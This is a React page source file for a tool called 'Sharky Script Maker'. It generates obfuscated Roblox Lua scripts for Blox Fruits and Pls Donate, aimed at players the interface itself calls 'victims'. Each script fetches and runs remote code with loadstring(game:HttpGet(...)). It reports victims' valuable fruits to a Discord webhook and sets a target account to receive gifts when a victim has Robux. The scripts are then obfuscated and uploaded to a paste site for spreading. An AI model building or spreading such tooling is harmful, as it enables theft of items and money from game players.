'use client';

import {useState, useEffect, useRef, useTransition} from 'react';
import {Button} from '@/components/ui/button';
import {Textarea} from '@/components/ui/textarea';
import {Checkbox} from '@/components/ui/checkbox';
import {Label} from '@/components/ui/label';
import {Input} from '@/components/ui/input';
import {Download, Copy, HelpCircle} from 'lucide-react';
import {useToast} from '@/hooks/use-toast'; // Assuming this is your custom hook path

import {obfuscateScript} from '@/ai/flows/obfuscate-script';
import ParticleComponent from '@/components/ParticleComponent';

import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip"
import {useIsMobile} from "@/hooks/use-mobile"; // Assuming this is your custom hook path
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

// --- Constants for Fruits ---
const mythicalFruits = [
  'Kitsune-Kitsune', 'Yeti-Yeti', 'Gas-Gas', 'Leopard-Leopard', 'Control-Control',
  'Dough-Dough', 'T-Rex-T-Rex', 'Spirit-Spirit', 'Mammoth-Mammoth', 'Venom-Venom',
];
const legendaryFruits = [
  'Portal-Portal', 'Buddha-Buddha', 'Rumble-Rumble', 'Creation-Creation' , 'Shadow-Shadow', 'Blizzard-Blizzard',
  'Sound-Sound', 'Phoenix-Phoenix', 'Pain-Pain', 'Gravity-Gravity', 'Love-Love',
  'Spider-Spider', 'Quake-Quake',
];
const rareFruits = [
'Magma-Magma', 'Ghost-Ghost', 'Rubber-Rubber', 'Light-Light',
];
const uncommonFruits = [
'Diamond-Diamond', 'Eagle-Eagle', 'Dark-Dark', 'Sand-Sand', 'Ice-Ice', 'Flame-Flame',
];
const commonFruits = [
'Spike-Spike', 'Smoke-Smoke', 'Bomb-Bomb', 'Spring-Spring', 'Blade-Blade', 'Spin-Spin', 'Rocket-Rocket',
];

const allFruits = [...mythicalFruits, ...legendaryFruits, ...rareFruits, ...uncommonFruits, ...commonFruits];
const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits, ...rareFruits, ...uncommonFruits, ...commonFruits];
const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];

// --- Define the expected URL prefix ---
const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/';
const PROTECTOR_URL = 'https://sharkyontop.pages.dev/'; // Define protector URL constant

// --- Script Templates ---
const templates = {
  BloxFruits: {
    template: (webhookUrl: string, usernames: string, selectedFruits: string[], giftTarget: string) => {
      const formattedUsernames = usernames
        .split('\n')
        .map(user => user.trim())
        .filter(user => user.length > 0)
        .map(user => `"${user}"`)
        .join(', ');

      const formattedFruits = selectedFruits
        .map(fruit => `"${fruit}"`)
        .join(', ');

      return `Webhook = "${webhookUrl}" -- << Protected Webhook Here
Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want
FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect
GiftTarget = "${giftTarget.trim()}" -- << Add the username that should be GIFTED if Victim has Robux
loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
    },
    fields: ['webhookUrl', 'usernames', 'selectedFruits', 'giftTarget']
  },
  PlsDonate: {
    template: (webhookUrl: string, username: string) => {
      return `Webhook = "${webhookUrl}" -- << Ur webhook
Username = "${username.trim()}" -- << Ur username

loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter3000/wow/refs/heads/main/test",true))()`;
    },
    fields: ['webhookUrl', 'usernames']
  }
};

// --- Type for error state to optionally include a link flag ---
type WebhookErrorState = {
    message: string;
    showLink?: boolean;
} | null;


export default function Home() {
  // --- State Variables ---
  const [currentStep, setCurrentStep] = useState<'selectType' | 'configureScript'>('selectType');
  const [scriptType, setScriptType] = useState<'BloxFruits' | 'PlsDonate' | ''>(''); // Initialize with empty string
  const [webhookUrl, setWebhookUrl] = useState('');
  const [usernames, setUsernames] = useState('');
  const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
  const [giftTarget, setGiftTarget] = useState(''); // New state for GiftTarget
  const [configuredScript, setConfiguredScript] = useState('');
  const [obfuscatedScript, setObfuscatedScript] = useState('');
  const [pastefyLink, setPastefyLink] = useState('');
  const {toast} = useToast();
  const [isPending, startTransition] = useTransition();
  const isMobile = useIsMobile();
  const [tooltipStates, setTooltipStates] = useState({
      webhookUrl: false,
      usernames: false,
      fruitsToHit: false,
      giftTarget: false, // Add tooltip state for GiftTarget
  });
  const [webhookError, setWebhookError] = useState<WebhookErrorState>(null);

  // --- Tooltip Logic ---
  const toggleTooltip = (field: keyof typeof tooltipStates) => {
      if (isMobile) {
          setTooltipStates(prevState => ({
              ...Object.fromEntries(
                  Object.keys(prevState).map(key => [key, false])
              ),
              [field]: !prevState[field],
          }));
      }
  };

  const isGenerating = isPending;

  // --- Input Validation Logic ---
  const handleGiftTargetChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Allow only alphanumeric characters and underscore, and remove spaces
    const sanitizedValue = value.replace(/\s+/g, '').replace(/[^a-zA-Z0-9_]/g, '');
    setGiftTarget(sanitizedValue);
  };

  // --- Handle Proceed to Configuration ---
  const handleProceed = () => {
    if (!scriptType) {
      toast({ title: 'Error', description: 'Please select a script type to proceed.', variant: 'destructive' });
      return;
    }
    setCurrentStep('configureScript');
  };

  // --- Generate Script Logic ---
  const generateScript = async () => {
    setWebhookError(null);
    setConfiguredScript('');
    setObfuscatedScript('');
    setPastefyLink('');

    if (!webhookUrl) {
        setWebhookError({ message: 'Protected WebhookURL is required.'});
        toast({ title: 'Error', description: 'Protected WebhookURL is required.', variant: 'destructive' });
        return;
    }
    if (!webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX)) {
        setWebhookError({
            message: 'Protected Webhook Required. Protect your discord webhook here:',
            showLink: true
        });
        toast({ title: 'Error', description: `Invalid Webhook URL format.`, variant: 'destructive' });
        return;
    }

    if (!usernames.trim()) {
        toast({ title: 'Error', description: 'Username(s) cannot be empty.', variant: 'destructive' });
        return;
    }

    let script = '';

    if (scriptType === 'BloxFruits') {
     if (selectedFruits.length === 0) {
        toast({ title: 'Error', description: 'Please select at least one fruit.', variant: 'destructive' });
        return;
      }
      if (!giftTarget.trim()) {
        toast({ title: 'Error', description: 'Gift Target username is required.', variant: 'destructive' });
        return;
      }
      script = templates.BloxFruits.template(webhookUrl, usernames, selectedFruits, giftTarget);
    } else if (scriptType === 'PlsDonate') {
      // For Pls Donate, take the first line of the usernames state as the single username
      const singleUsername = usernames.split('\n')[0].trim() || '';
       if (!singleUsername) {
        toast({ title: 'Error', description: 'Username cannot be empty for Pls Donate script.', variant: 'destructive' });
        return;
       }
      script = templates.PlsDonate.template(webhookUrl, singleUsername);
    }

    if (!script) {
        toast({ title: 'Error', description: 'Failed to generate script template.', variant: 'destructive' });
        return;
    }

    setConfiguredScript(script);

    startTransition(async () => {
      try {
        const obfuscationResult = await obfuscateScript({script: script});
        setObfuscatedScript(obfuscationResult.obfuscatedScript);
        setPastefyLink(obfuscationResult.pastefyLink);
        toast({
          title: 'Script Generated!',
          description: 'Script generated and obfuscated successfully.',
        });
      } catch (error: any) {
        console.error("Error during obfuscation:", error);
        toast({
          title: 'Error',
          description: `Failed to generate script: ${error.message}`,
          variant: 'destructive',
        });
        setObfuscatedScript('');
        setPastefyLink('');
      }
    });
  };

  // --- Fruit Selection Logic ---
  const handleFruitSelect = (fruit: string) => {
    setSelectedFruits(prev => {
      if (prev.includes(fruit)) {
        return prev.filter(f => f !== fruit);
      } else {
        return [...prev, fruit];
      }
    });
  };

  const handleSelectAllFruits = () => {
    setSelectedFruits(selectedFruits.length === allFruits.length ? [] : allFruits);
  };

  // --- Download Logic (remains the same) ---
  const downloadScript = () => {
    if (!obfuscatedScript) {
      toast({ title: 'Error', description: 'Please generate a script first.', variant: 'destructive' });
      return;
    }
    const blob = new Blob([obfuscatedScript], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'roblox_script.lua';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  // --- Copy Logic (remains the same) ---
  const copyToClipboard = async (textToCopy: string, successMessage: string) => {
     if (!textToCopy) {
       toast({ title: 'Error', description: 'Nothing to copy.', variant: 'destructive' });
       return;
     }
     try {
        await navigator.clipboard.writeText(textToCopy);
        toast({ title: 'Copied!', description: successMessage });
     } catch (err) {
        console.error('Failed to copy text: ', err);
        toast({ variant: "destructive", title: "Copy Failed", description: "Could not copy script." });
     }
  };

  // --- JSX Return ---
  return (
    <>
      <ParticleComponent />
      {/* Base text color set here */}
      <div className="flex flex-col items-center justify-center min-h-screen p-4 text-gray-100">
        {/* Container with background and base text color */}
        <div className="container mx-auto max-w-3xl w-full bg-gray-800 bg-opacity-80 p-8 rounded-lg border border-cyan-500/30 shadow-lg shadow-cyan-500/20 z-10 text-gray-100">

          {/* Apply the custom neon glow class to the main title */}
          <h1 className="text-3xl font-bold mb-8 text-center text-neon-blue-glow">
            Sharky Script Maker
          </h1>

          {currentStep === 'selectType' && (
            <div className="flex flex-col items-center">
              <div className="mb-4 w-full">
                <Label htmlFor="scriptType" className="text-cyan-400 font-bold">Select Script Type</Label>
                <Select value={scriptType} onValueChange={(value: 'BloxFruits' | 'PlsDonate') => setScriptType(value)}>
                  <SelectTrigger className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent">
                    <SelectValue placeholder="Select a script type" />
                  </SelectTrigger>
                  <SelectContent className="bg-gray-800 text-gray-100 border border-cyan-500/50 rounded-md">
                    <SelectItem value="BloxFruits">BloxFruits Script</SelectItem>
                    <SelectItem value="PlsDonate">Pls Donate Script</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <Button onClick={handleProceed} className="w-full mt-4 p-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-gray-900 font-bold rounded-md hover:from-cyan-400 hover:to-purple-500 transition duration-300 ease-in-out">
                Proceed to Configuration
              </Button>
            </div>
          )}

          {currentStep === 'configureScript' && (
            <>
              {/* Webhook Section (always visible in this step) */}
              <div className="mb-4">
                 <div className="flex items-center space-x-2 mb-2">
                    {/* Label: Use a standard highlight color, not the full glow */}
                    <Label htmlFor="webhookUrl" className="text-cyan-400 font-bold">Protected WebhookURL</Label>
                    <TooltipProvider>
                      <Tooltip
                        open={tooltipStates.webhookUrl}
                        onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, webhookUrl: open })}
                      >
                        <TooltipTrigger asChild>
                          <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('webhookUrl'); } }}>
                            <HelpCircle className="h-4 w-4 text-gray-400" />
                          </Button>
                        </TooltipTrigger>
                        {/* Tooltip Content: Use standard text colors */}
                        <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                            <p className="mb-2">Enter your <b>Protected Webhook URL</b> to receive notifications when the script detects a fruit.</p>
                            <p className="mb-2">First make a Discord Webhook, and then protect it here --&gt;{' '}
                                <a href={PROTECTOR_URL} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                                    {PROTECTOR_URL}
                                </a>.
                            </p>
                            <p>This allows the script to send messages to your Discord channel.</p>
                        </TooltipContent>
                      </Tooltip>
                    </TooltipProvider>
                  </div>
                  {/* Input: Standard text color */}
                  <Input
                    type="text"
                    id="webhookUrl"
                    value={webhookUrl}
                    onChange={e => {
                        setWebhookUrl(e.target.value);
                        if (webhookError) setWebhookError(null);
                    }}
                    placeholder="Enter your protected webhook URL"
                    className={`w-full p-3 bg-gray-900 border rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent ${webhookError ? 'border-red-500' : 'border-cyan-500/50'}`}
                  />
                  {/* Error Display: Standard error/link colors */}
                  {webhookError && (
                    <div className="mt-1">
                      <p className="text-sm text-red-400">{webhookError.message}</p>
                      {webhookError.showLink && (
                        <a
                          href={PROTECTOR_URL}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-sm text-blue-400 hover:underline"
                        >
                          {PROTECTOR_URL}
                        </a>
                      )}
                    </div>
                  )}
              </div>

              {/* Usernames Section (Label changes based on script type) */}
              <div className="mb-4">
                  <div className="flex items-center space-x-2 mb-2">
                    {/* Label: Standard highlight color */}
                    <Label htmlFor="usernames" className="text-cyan-400 font-bold">
                      {scriptType === 'BloxFruits' ? 'Usernames (one per line)' : 'Username'}
                    </Label>
                      <TooltipProvider>
                         <Tooltip
                          open={tooltipStates.usernames}
                          onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, usernames: open })}
                        >
                          <TooltipTrigger asChild>
                            <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('usernames'); } }}>
                              <HelpCircle className="h-4 w-4 text-gray-400" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                              {scriptType === 'BloxFruits' ? (
                                <ul>
                                  <li>Enter usernames of <b>YOUR</b> accounts.</li>
                                  <li>These will be the accounts that can use the script's commands.</li>
                                  <li>They will also be the ones sitting in trading tables with victims.</li>
                                  <li>Put one Roblox username per line, with <b>no spaces</b>.</li>
                                </ul>
                              ) : (
                                <p>Enter the username for the Pls Donate script.</p>
                              )}
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>
                  </div>
                  {/* Textarea: Standard text color */}
                  <Textarea
                    id="usernames"
                    value={usernames}
                    onChange={e => setUsernames(e.target.value)}
                    placeholder={scriptType === 'BloxFruits' ? 'Enter usernames, one per line' : 'Enter username'}
                    className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
                    style={{fontFamily: 'Roboto Mono, monospace'}}
                    rows={scriptType === 'BloxFruits' ? 4 : 1} // Adjust rows based on script type
                  />
              </div>

              {/* GiftTarget Section (conditionally visible for BloxFruits) */}
              {scriptType === 'BloxFruits' && (
                <div className="mb-4">
                    <div className="flex items-center space-x-2 mb-2">
                       {/* Label: Standard highlight color */}
                      <Label htmlFor="giftTarget" className="text-cyan-400 font-bold">Gift Target</Label>
                       <TooltipProvider>
                           <Tooltip
                            open={tooltipStates.giftTarget}
                            onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, giftTarget: open })}
                          >
                            <TooltipTrigger asChild>
                              <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('giftTarget'); } }}>
                                <HelpCircle className="h-4 w-4 text-gray-400" />
                              </Button>
                            </TooltipTrigger>
                            <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                                <p>Add the username that should be GIFTED if Victim has Robux</p>
                            </TooltipContent>
                          </Tooltip>
                      </TooltipProvider>
                    </div>
                    {/* Input: Standard text color */}
                    <Input
                      type="text"
                      id="giftTarget"
                      value={giftTarget}
                      onChange={handleGiftTargetChange} // Use the validation handler
                      placeholder="Enter username to gift"
                      className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
                    />
                </div>
              )}

              {/* Fruits Section (conditionally visible for BloxFruits) */}
              {scriptType === 'BloxFruits' && (
                <div className="mb-4">
                    <div className="flex justify-between items-center mb-2">
                       {/* Label: Standard highlight color */}
                      <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
                       <div className="flex items-center space-x-2">
                           <TooltipProvider>
                               <Tooltip
                                open={tooltipStates.fruitsToHit}
                                onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
                              >
                                <TooltipTrigger asChild>
                                  <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}>
                                    <HelpCircle className="h-4 w-4 text-gray-400" />
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                                    <ul>
                                      <li>Select the fruits you want the script to detect.</li>
                                      <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
                                    </ul>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                            <Button onClick={handleSelectAllFruits} variant="outline" size="sm" className="bg-blue-600 hover:bg-blue-500 text-gray-900 border-blue-700 px-2 py-1">
                               {selectedFruits.length === allFruits.length ? 'Deselect All' : 'Select All'}
                            </Button>
                        </div>
                    </div>
                    {/* Checkbox Area: Standard text color for labels */}
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
                      {sortedFruitsByRarity.map(fruit => (
                        <div key={fruit} className="flex items-center space-x-2">
                         <Checkbox
                            id={fruit}
                            checked={selectedFruits.includes(fruit)}
                            onCheckedChange={() => handleFruitSelect(fruit)}
                            className="border-cyan-500/50 data-[state=checked]:bg-cyan-500 data-[state=checked]:text-gray-900"
                          />
                          <label
                            htmlFor={fruit}
                            className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100" // Standard text
                          >
                            {fruit}
                          </label>
                        </div>
                      ))}
                    </div>
                </div>
              )}

              {/* Generate Button */}
              <div className="mb-4">
                <Button onClick={generateScript} className="w-full mt-4 p-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-gray-900 font-bold rounded-md hover:from-cyan-400 hover:to-purple-500 transition duration-300 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed" disabled={isGenerating}>
                  {isGenerating ? 'Generating...' : 'Generate Script'}
                </Button>
              </div>

              {/* Configured Script Output */}
              {configuredScript && (
                <div className="mb-4">
                  <div className="flex justify-between items-center mb-2">
                     {/* Label: Keep highlight color */}
                     <Label className="text-green-400 font-bold">Configured Script</Label>
                     <Button
                        onClick={() => copyToClipboard(configuredScript, 'Configured script copied.')}
                        variant="outline" size="sm"
                        className="bg-gray-600 hover:bg-gray-500 text-gray-100 border-gray-500 px-2 py-1"
                        >
                        <Copy className="h-3 w-3 mr-1" /> Copy
                     </Button>
                  </div>
                  {/* Textarea: Standard text color */}
                  <Textarea
                    value={configuredScript} readOnly
                    className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
                    rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
                  />
                </div>
              )}

              {/* Obfuscated Script Output */}
              {obfuscatedScript && (
                <div className="mb-4">
                   <div className="flex justify-between items-center mb-2">
                      {/* Label: Keep highlight color */}
                     <Label className="text-green-400 font-bold">Obfuscated Script</Label>
                     <Button
                        onClick={() => copyToClipboard(obfuscatedScript, 'Obfuscated script copied.')}
                        variant="outline" size="sm"
                        className="bg-green-600 hover:bg-green-500 text-gray-900 border-green-700 px-2 py-1"
                        >
                        <Copy className="h-3 w-3 mr-1" /> Copy
                     </Button>
                  </div>
                  {pastefyLink && (
                    <div className="mb-2 text-sm">
                      {/* Link: Keep highlight color */}
                      <span className="text-gray-400">Pastefy Link: </span>
                      <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-cyan-400 hover:underline break-all">
                        {pastefyLink}
                      </a>
                    </div>
                  )}
                  {/* Textarea: Standard text color */}
                  <Textarea
                    value={obfuscatedScript} readOnly
                    className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
                    rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
                  />
                </div>
              )}

              {/* Download Button: Keep highlight color */}
               <Button
                  onClick={downloadScript}
                  className="w-full mt-4 p-4 border border-cyan-500/50 text-cyan-400 bg-gray-800 hover:bg-gray-700 rounded-md disabled:opacity-50 disabled:cursor-not-allowed"
                  disabled={!obfuscatedScript || isGenerating}
                  variant="outline"
                >
                  <Download className="mr-2 h-4 w-4" />
                  Download Script
                </Button>
            </>
          )}


        </div>
      </div>
    </>
  );
}
